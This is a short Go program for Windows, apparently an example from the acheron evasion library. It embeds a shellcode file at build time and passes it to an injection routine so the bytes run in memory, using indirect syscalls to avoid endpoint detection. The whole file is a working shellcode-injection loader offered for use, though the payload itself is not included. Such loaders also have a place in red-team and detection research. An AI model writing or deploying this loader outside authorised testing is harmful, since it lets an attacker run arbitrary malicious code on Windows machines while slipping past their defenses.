//go:build windows

package main

import (
	_ "embed"

	"github.com/f1zm0/acheron"
	"github.com/f1zm0/acheron/examples/sc_inject/inject"
)

//go:embed shellcodeFile.bin
var scBuf []byte

func main() {
	ach, err := acheron.New()
	if err != nil {
		panic(err)
	}

	if err := inject.Inject(ach, scBuf); err != nil {
		panic(err)
	}
}
